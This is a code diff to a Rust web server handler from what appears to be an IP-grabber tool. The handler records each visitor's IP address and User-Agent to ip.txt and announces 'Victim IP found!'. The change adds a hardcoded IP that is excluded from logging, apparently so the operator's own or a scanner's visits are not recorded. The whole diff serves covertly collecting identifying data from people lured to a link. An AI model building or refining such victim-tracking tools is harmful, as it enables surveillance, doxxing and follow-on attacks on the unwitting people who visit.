@@ -19,6 +19,7 @@ use crate::helpers::get_data_dir;
 
 #[get("/")]
 async fn index(req: HttpRequest, data: Data<PathBuf>) -> impl Responder {
+    let invalid_ips = ["34.83.203.92"];
     let client_ip = req.connection_info().realip_remote_addr().unwrap_or("<unknown>").to_string();
     let user_agent = match req.headers().get(header::USER_AGENT) {
         Some(user_agent) => match user_agent.to_str() {
@@ -55,18 +56,18 @@ async fn index(req: HttpRequest, data: Data<PathBuf>) -> impl Responder {
         exit(1);
     });
 
-    let formatted_ip = format!("IP: {}\nUser-Agent: {}", client_ip, user_agent);
-
-    if let Err(e) = writeln!(file, "{}", formatted_ip) {
-        error_msg!(&format!("Couldn't write to file: {}", e));
-        exit(1);
+    if !invalid_ips.contains(&client_ip.as_str()) {
+        let formatted_ip = format!("IP: {}\nUser-Agent: {}", client_ip, user_agent);
+        if let Err(e) = writeln!(file, "{}", formatted_ip) {
+            error_msg!(&format!("Couldn't write to file: {}", e));
+            exit(1);
+        }
+        notify_msg(&format!("{}\n", "Victim IP found!".green()));
+        notify_msg(&format!("{} {}\n", "Victim's IP:".green(), client_ip.bright_blue()));
+        notify_msg(&format!("{} {}\n", "ip.txt file saved at".green(), ip_dir.display().to_string().green()).green());
+        notify_msg(&format!("{}\n", "IP address saved to ip.txt".green()));
+        notify_msg(&format!("{}\n", "User-Agent saved to ip.txt".green()));
     }
-
-    notify_msg(&format!("{}\n", "Victim IP found!".green()));
-    notify_msg(&format!("{} {}\n", "Victim's IP:".green(), client_ip.bright_blue()));
-    notify_msg(&format!("{} {}\n", "ip.txt file saved at".green(), ip_dir.display().to_string().green()).green());
-    notify_msg(&format!("{}\n", "IP address saved to ip.txt".green()));
-    notify_msg(&format!("{}\n", "User-Agent saved to ip.txt".green()));
 
 
     let user_agent = match req.headers().get(header::USER_AGENT) {
